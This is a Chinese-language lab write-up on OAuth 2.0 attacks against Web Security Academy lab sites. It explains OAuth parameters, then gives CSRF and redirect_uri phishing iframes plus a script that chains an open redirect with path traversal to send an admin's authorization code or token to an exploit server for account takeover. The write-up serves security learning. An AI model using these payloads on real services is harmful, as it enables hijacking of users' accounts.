## 记 OAuth2.0攻击

#### 0x00 OAuth2.0 参数剖析

**response_type：**code 表示要求返回授权码，token 表示直接返回令牌

**client_id：**客户端身份标识

**client_secret：**客户端密钥

**redirect_uri：**重定向地址

**scope：**表示授权的范围，read只读权限，all读写权限

**grant_type：**表示授权的方式

- AUTHORIZATION_CODE（授权码）

- password（密码）

- client_credentials（凭证式）

- refresh_token 更新令牌

------

#### 0x01 OAuth2.0 四种授权模式

- ###### 授权码（authorization-code）

  ![image-20220520175710334](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220520175710334.png)

- ###### 隐藏式（implicit）

  ![image-20220520175941184](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220520175941184.png)

- ###### 密码式（password）

  ![image-20220520180010086](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220520180010086.png)

- ###### 客户端凭证（client credentials）

  ![image-20220520180048200](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220520180048200.png)

------

#### 0x02 0Auth2.0 隐藏式身份验证绕过

**请求授权**

![image-20220520181246682](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220520181246682.png)

**同意授权获得token，通过token获取cookie**

![image-20220520181517199](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220520181517199.png)

**漏洞点/绕过点：**修改其它用户的邮箱，也能成功获得其它用户的cookie

![image-20220520181546600](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220520181546600.png)

**通过Burpsuite->Repeat request in browser校验**

![image-20220520181805499](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220520181805499.png)

![image-20220520182652158](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220520182652158.png)

------

#### 0x03 OAuth2.0 CSRF接管

**简单描叙一个功能点：**有点类似于绑定其它登录方式 或 绑定其它乱七八糟功能，绑定通过OAuth授权，如下图**Attach a social profile**，绑定其它社交信息

![image-20220520184150255](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220520184150255.png)

**点击绑定其它社交信息跳转到正常登录，登录后正常授权抓包**

![image-20220520184253580](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220520184253580.png)

![image-20220520184408228](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220520184408228.png)

**漏洞点：**生成一个code，用于绑定指定用户，**假设cookie是管理员的cookie，构造CSRF Poc html发送给管理员，则管理员就会绑定我们的账号**

![image-20220520184718526](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220520184718526.png)

构造**CSRF Poc html：**

```html
<iframe src="https://acc61f971eacf531c00b3d7f0064002d.web-security-academy.net/oauth-linking?code=VQwmD2XBVMCDgyjbMAgkt4zuQvUtkO_quJe-EKSC2OL"></iframe>
```

**发送给管理员点击后,选择其他社交方式登录重新登录一下**

![image-20220521143909043](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220521143909043.png)

------

#### 0x04 OAuth2.0 redirect_uri钓鱼导致账户劫持

**功能点：**正式登录授权后，退出登录，再次登录会自动授权

**漏洞点：**redirect_url未设置白名单导致可控，带着授权码访问到指定域

![image-20220521151508050](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220521151508050.png)

**构造POC:**发送给管理员钓鱼，redirect_uri设置为自己的服务器，或ceye

```
<iframe src="https://oauth-aca11f751fccbbe0c0f08e24022a0007.web-security-academy.net/auth?client_id=ghi5v1pgoqqo7fhx1q8ko&redirect_uri=https://exploit-ac091fa21fdfbbafc02a8ee801370068.web-security-academy.net/exploit&response_type=code&scope=openid%20profile%20email"></iframe>
```

查看日志，当管理员点击后，授权码将会被记录到Web日志中

![image-20220521151849006](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220521151849006.png)

退出账号，替换管理员的授权码重新登录

![image-20220521151919680](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220521151919680.png)

完成账户劫持

![image-20220521151938203](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220521151938203.png)

------

#### 0x05 OAuth2.0 重定向漏洞组合拳劫持管理员账户

与0x04漏洞原理一致，但是这边做了白名单限制，更贴近了实战

![image-20220521155829461](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220521155829461.png)

**同站点重定向漏洞：**

![image-20220521155925890](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220521155925890.png)

**组合拳：**利用重定向漏洞与目录穿越达到跳转，绕过白名单，既

`https://ac3f1f6b1fbafb3cc068038b00b400ed.web-security-academy.net/oauth-callback/../post/next?path=https://www.baidu.com`

**构造Poc：**

```
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-ac7f1fae1f27fb30c0ea0380028500a8.web-security-academy.net/auth?client_id=p9pdffs4rjxs88th8i9de&redirect_uri=https://ac3f1f6b1fbafb3cc068038b00b400ed.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-ac5a1fb91fbcfb5fc06d0382015d00cf.web-security-academy.net/exploit&response_type=token&nonce=1467868674&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```

**查看日志：**成功打到了token

![image-20220521160152887](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220521160152887.png)

利用token登录admin

![image-20220521160214012](https://raw.staticdn.net/ShmilyChris/wiki/main/image-20220521160214012.png)

#### 

